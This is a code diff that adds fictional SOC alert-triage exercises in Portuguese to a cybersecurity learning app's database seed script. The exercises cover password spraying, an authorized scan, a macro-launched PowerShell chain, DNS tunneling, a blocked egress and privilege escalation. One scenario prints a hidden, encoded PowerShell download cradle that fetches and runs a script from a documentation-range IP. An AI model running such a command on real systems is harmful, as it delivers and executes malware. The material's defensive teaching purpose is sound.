@@ -260,10 +260,175 @@ const labs = [
   },
 ];
 
+// ---------- SOC LAB — CENÁRIOS DE ALERTA (Fase 2) ----------
+// 100% fictício e educacional. IPs de origem/destino externos usam as faixas
+// reservadas para documentação (RFC 5737: 192.0.2.0/24, 198.51.100.0/24,
+// 203.0.113.0/24). Hostnames e IPs internos são de laboratório. Nada aqui
+// aponta pra infraestrutura real.
+//
+// classificacaoCorreta: "vp" (verdadeiro positivo) | "fp" (falso positivo) |
+// "investigar" (necessita mais dados antes de classificar).
+const socScenarios = [
+  {
+    id: "soc-0027", codigo: "SOC-0027", severidade: "alto", categoria: "Autenticação",
+    titulo: "Múltiplas falhas de login seguidas de sucesso",
+    origem: "198.51.100.23", destino: "SRV-AD01 (10.20.0.10)",
+    resumo: "Detectadas 14 tentativas de logon falhas contra várias contas em 3 minutos, a partir de um IP externo, seguidas de um logon bem-sucedido.",
+    contexto: "Fora do horário comercial (03:12 local). O IP de origem nunca apareceu nos logs antes. As contas-alvo incluem contas de serviço e um administrador júnior.",
+    timeline: [
+      { hora: "03:12:04", evento: "4625 Falha de logon", detalhe: "conta: svc-backup · origem: 198.51.100.23 · motivo: senha incorreta" },
+      { hora: "03:12:09", evento: "4625 Falha de logon", detalhe: "conta: jdoe · origem: 198.51.100.23" },
+      { hora: "03:12:55", evento: "4625 Falha de logon (x11)", detalhe: "contas variadas · mesma origem · uma tentativa por conta" },
+      { hora: "03:15:41", evento: "4624 Logon bem-sucedido", detalhe: "conta: t.helpdesk · tipo 3 (rede) · origem: 198.51.100.23" },
+      { hora: "03:16:20", evento: "4672 Privilégios especiais atribuídos", detalhe: "conta: t.helpdesk" },
+    ],
+    evidencias: [
+      "Uma tentativa por conta, muitas contas: padrão de password spraying (não força bruta numa conta só).",
+      "IP de origem sem histórico e geolocalização fora do país de operação.",
+      "O sucesso veio na mesma origem das falhas, minutos depois.",
+      "t.helpdesk não costuma logar por rede às 03h.",
+    ],
+    perguntasGuia: [
+      "O padrão é força bruta numa conta ou spraying em várias?",
+      "A origem do sucesso é a mesma das falhas?",
+      "O horário e o tipo de logon batem com o comportamento normal da conta?",
+    ],
+    classificacaoCorreta: "vp",
+    explicacao: "Verdadeiro positivo. O conjunto — spraying de um IP externo desconhecido, fora do horário, culminando num logon bem-sucedido da mesma origem e atribuição de privilégios — descreve um comprometimento de credencial em andamento. Ações: desabilitar t.helpdesk, forçar reset, isolar a sessão, revisar o que a conta acessou após 03:15 e bloquear o IP de origem.",
+  },
+  {
+    id: "soc-0031", codigo: "SOC-0031", severidade: "medio", categoria: "Rede",
+    titulo: "Varredura de portas contra sub-rede interna",
+    origem: "192.0.2.50 (VULN-SCAN01)", destino: "10.20.0.0/24",
+    resumo: "Um host disparou conexões SYN para centenas de portas em dezenas de máquinas da VLAN de servidores, em poucos minutos.",
+    contexto: "O host de origem é o VULN-SCAN01, servidor de varredura de vulnerabilidades da própria equipe de segurança. Existe uma janela de varredura autorizada toda quarta-feira, 02:00–04:00. O evento ocorreu quarta, 02:37.",
+    timeline: [
+      { hora: "02:37:10", evento: "Firewall: muitos SYN", detalhe: "origem 192.0.2.50 · destinos 10.20.0.5–10.20.0.60 · portas 1–1024" },
+      { hora: "02:41:52", evento: "IDS: assinatura port-scan", detalhe: "TCP connect scan · origem 192.0.2.50" },
+      { hora: "03:55:00", evento: "Varredura encerrada", detalhe: "origem 192.0.2.50 para de enviar" },
+    ],
+    evidencias: [
+      "Origem = servidor de varredura conhecido e documentado da equipe.",
+      "Horário dentro da janela autorizada (quarta 02:00–04:00).",
+      "Nenhuma exploração ou payload — só enumeração TCP.",
+      "Change/registro de varredura existe no calendário da equipe.",
+    ],
+    perguntasGuia: [
+      "A origem é um ativo conhecido e autorizado?",
+      "O horário cai numa janela de manutenção/varredura documentada?",
+      "Houve alguma ação além de enumeração?",
+    ],
+    classificacaoCorreta: "fp",
+    explicacao: "Falso positivo. É a varredura autorizada da própria equipe de segurança, dentro da janela documentada, sem exploração. Ação: suprimir/ajustar o alerta para a origem e janela conhecidas (allowlist com data de revisão), mantendo o alerta ativo para varreduras fora da janela ou de outras origens.",
+  },
+  {
+    id: "soc-0033", codigo: "SOC-0033", severidade: "critico", categoria: "Execução",
+    titulo: "PowerShell codificado iniciado por conta comum",
+    origem: "WKS-3412 (10.30.5.12)", destino: "203.0.113.77",
+    resumo: "Um processo powershell.exe foi iniciado com o parâmetro -EncodedCommand por uma conta de usuário sem função técnica, e em seguida abriu conexão de saída para um IP externo.",
+    contexto: "O usuário m.silva trabalha no financeiro. A estação nunca executou PowerShell administrativo antes. O comando decodificado baixa e executa um script de um host remoto.",
+    timeline: [
+      { hora: "14:02:11", evento: "Processo criado", detalhe: "powershell.exe -nop -w hidden -EncodedCommand <base64> · pai: winword.exe · usuário: m.silva" },
+      { hora: "14:02:12", evento: "Base64 decodificado (pelo EDR)", detalhe: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/a')" },
+      { hora: "14:02:13", evento: "Conexão de saída", detalhe: "10.30.5.12 → 203.0.113.77:80" },
+      { hora: "14:02:40", evento: "Nova tarefa agendada", detalhe: "cria persistência: executa a cada logon" },
+    ],
+    evidencias: [
+      "PowerShell oculto e codificado iniciado a partir do Word (macro).",
+      "Comando decodificado baixa e executa código remoto (download cradle).",
+      "Conexão imediata para IP externo sem reputação.",
+      "Criação de tarefa agendada = tentativa de persistência.",
+      "Comportamento totalmente atípico para a conta e a estação.",
+    ],
+    perguntasGuia: [
+      "Qual processo iniciou o PowerShell? O que o comando faz depois de decodificado?",
+      "Houve conexão de saída ou tentativa de persistência?",
+      "Isso é compatível com a função do usuário e o histórico da máquina?",
+    ],
+    classificacaoCorreta: "vp",
+    explicacao: "Verdadeiro positivo. Word → PowerShell oculto/codificado → download cradle → C2 → persistência é uma cadeia de execução maliciosa clássica (provável phishing com macro). Ações: isolar WKS-3412 da rede, matar o processo e a tarefa agendada, coletar o anexo/e-mail, bloquear 203.0.113.77, resetar as credenciais de m.silva e caçar o mesmo IOC no resto do parque.",
+  },
+  {
+    id: "soc-0035", codigo: "SOC-0035", severidade: "alto", categoria: "Exfiltração",
+    titulo: "Volume anômalo de consultas DNS TXT",
+    origem: "WKS-2201 (10.30.4.7)", destino: "resolver interno → domínio externo",
+    resumo: "Uma estação gerou milhares de consultas DNS TXT para subdomínios longos e aleatórios de um único domínio registrado há 2 dias.",
+    contexto: "O domínio consultado não tem site nem reputação. As consultas são constantes (uma a cada poucos segundos) há 40 minutos. O usuário está logado e ativo.",
+    timeline: [
+      { hora: "10:05:00", evento: "DNS: primeira consulta TXT", detalhe: "a8f3k2...9c.exfil-lab-example.test · tipo TXT" },
+      { hora: "10:05:12", evento: "DNS: consultas TXT contínuas", detalhe: "subdomínios de ~50 caracteres, base32, sempre o mesmo domínio pai" },
+      { hora: "10:44:00", evento: "Ainda em andamento", detalhe: "~1.900 consultas acumuladas de WKS-2201" },
+    ],
+    evidencias: [
+      "Subdomínios longos e aleatórios = dados codificados, não navegação normal.",
+      "Domínio pai recém-registrado, sem conteúdo nem reputação.",
+      "Só consultas TXT, em alta frequência e constante — padrão de canal.",
+      "Ainda não há confirmação de qual processo está gerando as consultas.",
+    ],
+    perguntasGuia: [
+      "O formato dos subdomínios parece navegação legítima ou dado codificado?",
+      "Qual a idade e a reputação do domínio pai?",
+      "Você já sabe qual processo/host está gerando isso?",
+    ],
+    classificacaoCorreta: "investigar",
+    explicacao: "Necessita investigação (com forte suspeita de exfiltração/tunneling por DNS). O padrão é altamente suspeito, mas antes de classificar como verdadeiro positivo falta: identificar o processo de origem na estação, confirmar se há dado saindo (tamanho/entropia do payload) e descartar software legítimo mal-comportado. Enquanto isso: conter a estação por precaução e bloquear o domínio no resolver.",
+  },
+  {
+    id: "soc-0038", codigo: "SOC-0038", severidade: "baixo", categoria: "Firewall",
+    titulo: "Conexão de saída bloqueada pela política",
+    origem: "SRV-APP07 (10.20.3.7)", destino: "203.0.113.200:8443",
+    resumo: "O firewall registrou e bloqueou uma tentativa de conexão de saída de um servidor de aplicação para um IP externo numa porta alta.",
+    contexto: "Política de egress do segmento de servidores: só HTTP/HTTPS para destinos aprovados e DNS para o resolver interno. O destino 203.0.113.200 não está na lista de aprovados. Uma única tentativa, sem repetição, coincidindo com uma atualização de biblioteca do app que tenta telemetria.",
+    timeline: [
+      { hora: "16:20:03", evento: "Firewall: DENY egress", detalhe: "10.20.3.7 → 203.0.113.200:8443 · regra: default-deny egress" },
+      { hora: "16:20:03", evento: "App log", detalhe: "\"telemetry endpoint unreachable, continuing\"" },
+      { hora: "—", evento: "Sem novas tentativas", detalhe: "nenhuma outra conexão para o destino nas 24h seguintes" },
+    ],
+    evidencias: [
+      "A conexão foi BLOQUEADA — a política funcionou como projetada.",
+      "Uma única tentativa, correlacionada com telemetria de uma dependência do app.",
+      "Nenhum sinal de comprometimento (sem processo estranho, sem persistência, sem outras conexões).",
+    ],
+    perguntasGuia: [
+      "A conexão foi permitida ou bloqueada?",
+      "Há um motivo benigno plausível e correlacionado?",
+      "Existe algum outro indicador de comprometimento no host?",
+    ],
+    classificacaoCorreta: "fp",
+    explicacao: "Falso positivo do ponto de vista de incidente de segurança. O controle funcionou: o egress foi negado. O ruído vem de uma dependência do app tentando enviar telemetria para um endpoint não aprovado. Ação: decidir com o time do app se o endpoint deve ser aprovado ou a telemetria desligada, e ajustar o alerta para não escalar bloqueios esperados dessa origem.",
+  },
+  {
+    id: "soc-0040", codigo: "SOC-0040", severidade: "critico", categoria: "Alteração administrativa",
+    titulo: "Conta adicionada a grupo de alto privilégio fora da janela",
+    origem: "conta: a.junior", destino: "grupo: Domain Admins",
+    resumo: "Um usuário foi adicionado ao grupo Domain Admins às 22:40, fora de qualquer janela de mudança, por uma conta que normalmente não administra o AD.",
+    contexto: "Não há ticket de mudança associado. A conta que fez a alteração (a.junior) teve um logon suspeito mais cedo no mesmo dia (ver SOC-0027-like). O usuário adicionado (b.reboucas) está de férias.",
+    timeline: [
+      { hora: "22:38:10", evento: "4624 Logon", detalhe: "conta: a.junior · origem: WKS-9001 · tipo 10 (RDP)" },
+      { hora: "22:40:02", evento: "4728 Membro adicionado a grupo global", detalhe: "grupo: Domain Admins · membro: b.reboucas · por: a.junior" },
+      { hora: "22:41:30", evento: "4672 Privilégios especiais", detalhe: "conta: b.reboucas" },
+      { hora: "22:43:00", evento: "Sem ticket de mudança", detalhe: "nenhuma mudança aprovada para essa janela" },
+    ],
+    evidencias: [
+      "Mudança de grupo crítico sem ticket e fora de janela.",
+      "Executada por conta que não administra o AD normalmente.",
+      "O usuário adicionado está de férias (não deveria precisar de acesso).",
+      "Correlaciona com atividade de credencial suspeita mais cedo no dia.",
+    ],
+    perguntasGuia: [
+      "Existe mudança aprovada para essa alteração e janela?",
+      "Quem executou a mudança costuma administrar o AD?",
+      "O beneficiário da mudança tem motivo legítimo agora?",
+    ],
+    classificacaoCorreta: "vp",
+    explicacao: "Verdadeiro positivo. Escalonamento de privilégio: alteração de grupo crítico, sem mudança aprovada, fora de janela, por conta atípica, beneficiando um usuário ausente — provável abuso de credencial comprometida para ganhar persistência com privilégio máximo. Ações: reverter a alteração, desabilitar a.junior e b.reboucas, revisar tudo que essas contas fizeram, acionar IR e resetar credenciais privilegiadas (assumir Tier 0 comprometido).",
+  },
+];
+
 export async function seedCyberIfNeeded() {
   const metaRef = doc(db, "content", "meta");
   const metaSnap = await getDoc(metaRef);
-  if (metaSnap.exists() && metaSnap.data().cyberSeededV1) {
+  if (metaSnap.exists() && metaSnap.data().cyberSeededV2) {
     console.log("[seed] Cybersecurity já populado, pulando.");
     return { seeded: false };
   }
@@ -272,13 +437,18 @@ export async function seedCyberIfNeeded() {
   tracks.forEach((t) => batch.set(doc(db, "content", "cyberTracks", "items", t.id), t));
   lessons.forEach((l) => batch.set(doc(db, "content", "cyberLessons", "items", l.id), l));
   labs.forEach((lab) => batch.set(doc(db, "content", "cyberLabs", "items", lab.id), lab));
+  socScenarios.forEach((s) => batch.set(doc(db, "content", "socScenarios", "items", s.id), s));
   batch.set(
     metaRef,
-    { cyberSeededV1: true, cyberCounts: { tracks: tracks.length, lessons: lessons.length, labs: labs.length }, cyberSeededV1At: serverTimestamp() },
+    {
+      cyberSeededV2: true,
+      cyberCounts: { tracks: tracks.length, lessons: lessons.length, labs: labs.length, socScenarios: socScenarios.length },
+      cyberSeededV2At: serverTimestamp(),
+    },
     { merge: true }
   );
 
   await batch.commit();
-  console.log(`[seed] ✅ Cybersecurity: ${tracks.length} trilhas, ${lessons.length} lições, ${labs.length} labs`);
+  console.log(`[seed] ✅ Cybersecurity: ${tracks.length} trilhas, ${lessons.length} lições, ${labs.length} labs, ${socScenarios.length} cenários SOC`);
   return { seeded: true };
 }
